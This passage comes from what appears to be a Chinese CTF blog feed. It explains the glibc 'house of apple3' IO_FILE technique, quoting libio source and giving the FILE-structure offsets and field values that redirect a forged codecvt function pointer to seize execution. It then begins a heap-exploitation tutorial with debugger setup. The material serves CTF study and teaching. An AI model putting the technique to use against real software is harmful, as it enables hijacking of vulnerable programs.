class="number">0x500</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="house-of-some"><a href="#house-of-some" class="headerlink" title="house of some"></a><a class="link"   href="https://blog.csome.cc/p/house-of-some/" >house of some <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h1><p> <code>house of apple2</code> 的一条路线之一。</p>
<h1 id="house-of-apple3"><a href="#house-of-apple3" class="headerlink" title="house of apple3"></a><a class="link"   href="https://bbs.kanxue.com/thread-273863.htm#msg_header_h2_1" >house of apple3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h1><p><strong>前置条件</strong></p>
<p>如果<code>_wide_data</code>设置不当的话会影响某些利用链的分支走向。但采用默认的<code>_wide_data</code>成员（默认会指向<code>_IO_wide_data_2</code>，除了<code>_wide_vtable</code>外其他成员均默认为<code>0</code>），也并不影响<code>house of apple3</code>的利用。因此，如果能伪造整个<code>FILE</code>结构体，则需要设置合适的<code>_wide_data</code>；如果只能伪部分<code>FILE</code>的成员的话，保持<code>fp-&gt;_wide_data</code>为默认地址即可。</p>
<ul>
<li>已知<code>heap</code>地址和<code>glibc</code>地址</li>
<li>能控制程序执行<code>IO</code>操作，包括但不限于：从<code>main</code>函数返回、调用<code>exit</code>函数、通过<code>__malloc_assert</code>触发</li>
<li>能控制<code>_IO_FILE</code>的<code>vtable</code>和<code>_codecvt</code>，一般使用<code>largebin attack</code>去控制</li>
</ul>
<h2 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h2><p><code>FILE</code>结构体中有一个成员<code>struct _IO_codecvt *_codecvt;</code>，偏移为<code>0x98</code>。该结构体参与宽字符的转换工作，结构体相关定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_iconv_t __cd_in;</span><br><span class="line">  _IO_iconv_t __cd_out;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">__gconv_step</span> *step;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">__gconv_step_data</span> step_data;</span><br><span class="line">&#125; _IO_iconv_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">__gconv_step</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">__gconv_loaded_object</span> *__shlib_handle; <span class="comment">// 关注这个成员</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *__modname;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* For internal use by glibc.  (Accesses to this member must occur</span></span><br><span class="line"><span class="comment">     when the internal __gconv_lock mutex is acquired).  */</span></span><br><span class="line">  <span class="type">int</span> __counter;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *__from_name;</span><br><span class="line">  <span class="type">char</span> *__to_name;</span><br><span class="line"></span><br><span class="line">  __gconv_fct __fct;</span><br><span class="line">  __gconv_btowc_fct __btowc_fct;</span><br><span class="line">  __gconv_init_fct __init_fct;</span><br><span class="line">  __gconv_end_fct __end_fct;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Information about the number of bytes needed or produced in this</span></span><br><span class="line"><span class="comment">     step.  This helps optimizing the buffer sizes.  */</span></span><br><span class="line">  <span class="type">int</span> __min_needed_from;</span><br><span class="line">  <span class="type">int</span> __max_needed_from;</span><br><span class="line">  <span class="type">int</span> __min_needed_to;</span><br><span class="line">  <span class="type">int</span> __max_needed_to;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flag whether this is a stateful encoding or not.  */</span></span><br><span class="line">  <span class="type">int</span> __stateful;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *__data;		<span class="comment">/* Pointer to step-local data.  */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">__gconv_step_data</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *__outbuf;    <span class="comment">/* Output buffer for this step.  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *__outbufend; <span class="comment">/* Address of first byte after the output</span></span><br><span class="line"><span class="comment">				 buffer.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Is this the last module in the chain.  */</span></span><br><span class="line">  <span class="type">int</span> __flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Counter for number of invocations of the module function for this</span></span><br><span class="line"><span class="comment">     descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> __invocation_counter;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flag whether this is an internal use of the module (in the mb*towc*</span></span><br><span class="line"><span class="comment">     and wc*tomb* functions) or regular with iconv(3).  */</span></span><br><span class="line">  <span class="type">int</span> __internal_use;</span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> *__statep;</span><br><span class="line">  <span class="type">__mbstate_t</span> __state;	<span class="comment">/* This element must not be used directly by</span></span><br><span class="line"><span class="comment">			   any module; always use STATEP!  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>house of apple3</code>的利用主要关注三个函数：<code>__libio_codecvt_in</code>、<code>__libio_codecvt_out</code>和<code>__libio_codecvt_length</code>。三个函数的利用点都差不多。</p>
<p><strong>__libio_codecvt_in</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Type of a conversion function.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*__gconv_fct)</span> <span class="params">(<span class="keyword">struct</span> __gconv_step *, <span class="keyword">struct</span> __gconv_step_data *,</span></span><br><span class="line"><span class="params">			    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> **, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *,</span></span><br><span class="line"><span class="params">			    <span class="type">unsigned</span> <span class="type">char</span> **, <span class="type">size_t</span> *, <span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DL_CALL_FCT</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_CALL_FCT(fct, args) fct args</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span></span></span><br><span class="line"><span class="class">__<span class="title">libio_codecvt_in</span> (<span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">codecvt</span>, __<span class="title">mbstate_t</span> *<span class="title">statep</span>,</span></span><br><span class="line"><span class="class">		    <span class="title">const</span> <span class="title">char</span> *<span class="title">from_start</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">from_end</span>,</span></span><br><span class="line"><span class="class">		    <span class="title">const</span> <span class="title">char</span> **<span class="title">from_stop</span>,</span></span><br><span class="line"><span class="class">		    <span class="title">wchar_t</span> *<span class="title">to_start</span>, <span class="title">wchar_t</span> *<span class="title">to_end</span>, <span class="title">wchar_t</span> **<span class="title">to_stop</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">result</span>;</span></span><br><span class="line">  <span class="comment">// gs 源自第一个参数</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">gs</span> =</span> codecvt-&gt;__cd_in.step;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  <span class="type">size_t</span> dummy;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *from_start_copy = (<span class="type">unsigned</span> <span class="type">char</span> *) from_start;</span><br><span class="line"></span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbuf = (<span class="type">unsigned</span> <span class="type">char</span> *) to_start;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbufend = (<span class="type">unsigned</span> <span class="type">char</span> *) to_end;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__statep = statep;</span><br><span class="line">  <span class="comment">// 如果gs-&gt;__shlib_handle不为空，则会用__pointer_guard去解密</span></span><br><span class="line">  <span class="comment">// 这里如果可控，设置为NULL即可绕过解密</span></span><br><span class="line">  __gconv_fct fct = gs-&gt;__fct;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="keyword">if</span> (gs-&gt;__shlib_handle != <span class="literal">NULL</span>)</span><br><span class="line">    PTR_DEMANGLE (fct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">// 这里有函数指针调用</span></span><br><span class="line">  <span class="comment">// 这个宏就是调用fct(gs, ...)</span></span><br><span class="line">  status = DL_CALL_FCT (fct,</span><br><span class="line">			(gs, &amp;codecvt-&gt;__cd_in.step_data, &amp;from_start_copy,</span><br><span class="line">			 (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) from_end, <span class="literal">NULL</span>,</span><br><span class="line">			 &amp;dummy, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  *from_stop = (<span class="type">const</span> <span class="type">char</span> *) from_start_copy;</span><br><span class="line">  *to_stop = (<span class="type">wchar_t</span> *) codecvt-&gt;__cd_in.step_data.__outbuf;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (status)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> __GCONV_OK:</span><br><span class="line">    <span class="keyword">case</span> __GCONV_EMPTY_INPUT:</span><br><span class="line">      result = __codecvt_ok;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> __GCONV_FULL_OUTPUT:</span><br><span class="line">    <span class="keyword">case</span> __GCONV_INCOMPLETE_INPUT:</span><br><span class="line">      result = __codecvt_partial;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = __codecvt_error;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>__libio_codecvt_out</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span></span></span><br><span class="line"><span class="class">__<span class="title">libio_codecvt_out</span> (<span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">codecvt</span>, __<span class="title">mbstate_t</span> *<span class="title">statep</span>,</span></span><br><span class="line"><span class="class">		     <span class="title">const</span> <span class="title">wchar_t</span> *<span class="title">from_start</span>, <span class="title">const</span> <span class="title">wchar_t</span> *<span class="title">from_end</span>,</span></span><br><span class="line"><span class="class">		     <span class="title">const</span> <span class="title">wchar_t</span> **<span class="title">from_stop</span>, <span class="title">char</span> *<span class="title">to_start</span>, <span class="title">char</span> *<span class="title">to_end</span>,</span></span><br><span class="line"><span class="class">		     <span class="title">char</span> **<span class="title">to_stop</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">result</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">gs</span> =</span> codecvt-&gt;__cd_out.step;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  <span class="type">size_t</span> dummy;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *from_start_copy = (<span class="type">unsigned</span> <span class="type">char</span> *) from_start;</span><br><span class="line"></span><br><span class="line">  codecvt-&gt;__cd_out.step_data.__outbuf = (<span class="type">unsigned</span> <span class="type">char</span> *) to_start;</span><br><span class="line">  codecvt-&gt;__cd_out.step_data.__outbufend = (<span class="type">unsigned</span> <span class="type">char</span> *) to_end;</span><br><span class="line">  codecvt-&gt;__cd_out.step_data.__statep = statep;</span><br><span class="line"></span><br><span class="line">  __gconv_fct fct = gs-&gt;__fct;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="keyword">if</span> (gs-&gt;__shlib_handle != <span class="literal">NULL</span>)</span><br><span class="line">    PTR_DEMANGLE (fct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  status = DL_CALL_FCT (fct,</span><br><span class="line">			(gs, &amp;codecvt-&gt;__cd_out.step_data, &amp;from_start_copy,</span><br><span class="line">			 (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) from_end, <span class="literal">NULL</span>,</span><br><span class="line">			 &amp;dummy, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  *from_stop = (<span class="type">wchar_t</span> *) from_start_copy;</span><br><span class="line">  *to_stop = (<span class="type">char</span> *) codecvt-&gt;__cd_out.step_data.__outbuf;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (status)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> __GCONV_OK:</span><br><span class="line">    <span class="keyword">case</span> __GCONV_EMPTY_INPUT:</span><br><span class="line">      result = __codecvt_ok;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> __GCONV_FULL_OUTPUT:</span><br><span class="line">    <span class="keyword">case</span> __GCONV_INCOMPLETE_INPUT:</span><br><span class="line">      result = __codecvt_partial;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = __codecvt_error;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>__libio_codecvt_length</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__libio_codecvt_length (<span class="keyword">struct</span> _IO_codecvt *codecvt, <span class="type">__mbstate_t</span> *statep,</span><br><span class="line">			<span class="type">const</span> <span class="type">char</span> *from_start, <span class="type">const</span> <span class="type">char</span> *from_end,</span><br><span class="line">			<span class="type">size_t</span> max)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *cp = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) from_start;</span><br><span class="line">  <span class="type">wchar_t</span> to_buf[max];</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">gs</span> =</span> codecvt-&gt;__cd_in.step;</span><br><span class="line">  <span class="type">size_t</span> dummy;</span><br><span class="line"></span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbuf = (<span class="type">unsigned</span> <span class="type">char</span> *) to_buf;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbufend = (<span class="type">unsigned</span> <span class="type">char</span> *) &amp;to_buf[max];</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__statep = statep;</span><br><span class="line"></span><br><span class="line">  __gconv_fct fct = gs-&gt;__fct;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="keyword">if</span> (gs-&gt;__shlib_handle != <span class="literal">NULL</span>)</span><br><span class="line">    PTR_DEMANGLE (fct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  DL_CALL_FCT (fct,</span><br><span class="line">	       (gs, &amp;codecvt-&gt;__cd_in.step_data, &amp;cp,</span><br><span class="line">		(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) from_end, <span class="literal">NULL</span>,</span><br><span class="line">		&amp;dummy, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  result = cp - (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) from_start;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="利用-IO-wfile-underflow函数控制程序执行流"><a href="#利用-IO-wfile-underflow函数控制程序执行流" class="headerlink" title="利用_IO_wfile_underflow函数控制程序执行流"></a>利用_IO_wfile_underflow函数控制程序执行流</h3><h4 id="相关配置-4"><a href="#相关配置-4" class="headerlink" title="相关配置"></a>相关配置</h4><p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~(4 | 0x10)</code></li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow</code>即可</li>
<li><code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
<li><code>_wide_data</code>保持默认，或者设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
<li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li>
<li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li>
</ul>
<h4 id="函数调用链-4"><a href="#函数调用链-4" class="headerlink" title="函数调用链"></a>函数调用链</h4><p><code>_IO_wfile_underflow-&gt;__libio_codecvt_in-&gt;DL_CALL_FCT(gs=fp-&gt;_codecvt-&gt;__cd_in.step)-&gt;*(gs -&gt;__fct)(gs)</code>。</p>
<p>需要设置<code>fp-&gt;_flags &amp; _IO_NO_READS == 0</code>，设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</code>，设置<code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>不进入调用，设置<code>fp-&gt;_wide_data-&gt;_IO_buf_base != NULL</code>不进入调用。</p>
<p><strong>详细分析</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="comment">// 最好不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 最好不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">      _IO_wdoallocbuf (fp);<span class="comment">// 需要走到这里</span></span><br><span class="line">    &#125;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">     </span><br><span class="line">    <span class="comment">// 需要调用到这里</span></span><br><span class="line">  __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">              fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">              &amp;read_stop,</span><br><span class="line">              fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">              fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">              &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而<code>_IO_wfile_underflow</code>又是<code>_IO_wfile_jumps</code>这个<code>_IO_jump_t</code>类型变量的成员函数。因此可以劫持或者伪造<code>FILE</code>结构体的<code>fp-&gt;vtable</code>为<code>_IO_wfile_jumps</code>，<code>fp-&gt;_codecvt</code>为可控堆地址，当程序执行<code>IO</code>操作时，控制程序执行流走到<code>_IO_wfile_underflow</code>，设置好<code>fp-&gt;codecvt-&gt;__cd_in</code>结构体，使得最终调用到<code>__libio_codecvt_in</code>中的<code>DL_CALL_FCT</code>宏，伪造函数指针，进而控制程序执行流。</p>
<h1 id="house-of-obstack"><a href="#house-of-obstack" class="headerlink" title="house of obstack"></a>house of obstack</h1>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn_IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解Pwn_heap及赛题详细解析</title>
    <url>/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>ptmalloc2</code> 的管理方式，<code>chunk</code> 结构和 <code>bins</code> 的模型，在<a class="link"   href="https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/" >Overview of GLIBC heap exploitation techniques <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/introduction/" >ctfwiki <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 以及<a class="link"   href="https://blog.csdn.net/Tokameine/article/details/119490052" >一些博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>已经讲解的非常清楚，本文记录自己的学习堆利用的过程。主要更新 <code>glibc-2.23，2.27，2.31，2.35，2.37</code> 主流版本和相关例题，<code>glibc-2.23</code> 后面更新一些变化和新的利用方式，这里不包含 <code>IO_FILE</code> 的内容，<code>IO_FILE</code> 会单独做一个专题。建议看完 <code>glibc</code> 源码分析后再来看，当然直接看也无所谓。目前比赛的 <code>glibc</code> 版本基本都是这几个长期支持版本，期间版本就不写了，另外文中没有标记 <code>glibc</code> 版本的就是到目前位置依然适用的方法。我将我的部分文章做了一个合集，入门新手先凑合着看吧。再看从前写的文章，很是稚嫩，不太易读易懂。</p>
<ul>
<li>主要配置</li>
</ul>
<p><a class="link"   href="https://github.com/RoderickChan/pwncli" >pwncli <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://github.com/scwuaptx/Pwngdb" >PwnGdb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://bbs.kanxue.com/thread-276203.htm" >gdb配置参考 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<ul>
<li>我的主要操作环境</li>
</ul>
<p><code>wsl-kali</code>。配置参考我的<a class="link"   href="https://bbs.kanxue.com/thread-278044.htm" >另一篇文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p><code>docker desktop</code>镜像</p>
<p><code>ubuntu:16.04</code></p>
<p><code>ubuntu:18.04</code></p>
<p><code>ubuntu:20.04</code></p>
<p><code>ubuntu:22.04</code></p>
<p><code>ubuntu:23.04</code></p>
<p>编译时可以加<code>-g</code>来方便调试。</p>
<p><code>ida pro 7.7 + gdb</code>调试。</p>
<ul>
<li>我的<code>.gdbinit</code>文件</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">source ~/pwndbg/gdbinit.py</span><br><span class="line">source ~/peda/peda.py</span><br><span class="line">source ~/Pwngdb/pwngdb.py</span><br><span class="line">source ~/Pwngdb/angelheap/gdbinit.py</span><br><span class="line"></span><br><span class="line">define hook-run</span><br><span class="line">python</span><br><span class="line"><span class="keyword">import</span> angelheap</span><br><span class="line">angelheap.init_angelheap()</span><br><span class="line">end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"><span class="comment">#set context-clear-screen on</span></span><br><span class="line"><span class="comment">#set debug-events off</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#source /root/splitmind/gdbinit.py</span></span><br><span class="line"><span class="comment">#python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sections = &quot;regs&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#mode = input(&quot;source/disasm/mixed mode:?(s/d/m)&quot;) or &quot;d&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#import splitmind</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#spliter = splitmind.Mind()</span></span><br><span class="line"><span class="comment">#spliter.select(&quot;main&quot;).right(display=&quot;regs&quot;, size=&quot;50%&quot;)</span></span><br><span class="line"><span class="comment">#gdb.execute(&quot;set context-stack-lines 10&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#legend_on = &quot;code&quot;</span></span><br><span class="line"><span class="comment">#if mode == &quot;d&quot;:</span></span><br><span class="line"><span class="comment">#    legend_on = &quot;disasm&quot;</span></span><br><span class="line"><span class="comment">#    sections += &quot; disasm&quot;</span></span><br><span class="line"><span class="comment">#    spliter.select(&quot;main&quot;).above(display=&quot;disasm&quot;, size=&quot;70%&quot;, banner=&quot;none&quot;)</span></span><br><span class="line"><span class="comment">#    gdb.execute(&quot;set context-code-lines 30&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#elif mode == &quot;s&quot;:</span></span><br><span class="line"><span class="comment">#    sections += &quot; code&quot;</span></span><br><span class="line"><span class="comment">#    spliter.select(&quot;main&quot;).above(display=&quot;code&quot;, size=&quot;70%&quot;, banner=&quot;none&quot;)</span></span><br><span class="line"><span class="comment">#    gdb.execute(&quot;set context-source-code-lines 30&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#else:</span></span><br><span class="line"><span class="comment">#    sections += &quot; disasm code&quot;</span></span><br><span class="line"><span class="comment">#    spliter.select(&quot;main&quot;).above(display=&quot;code&quot;, size=&quot;70%&quot;)</span></span><br><span class="line"><span class="comment">#    spliter.select(&quot;code&quot;).below(display=&quot;disasm&quot;, size=&quot;40%&quot;)</span></span><br><span class="line"><span class="comment">#    gdb.execute(&quot;set context-code-lines 8&quot;)</span></span><br><span class="line"><span class="comment">#    gdb.execute(&quot;set context-source-code-lines 20&quot;)</span></span><br><span 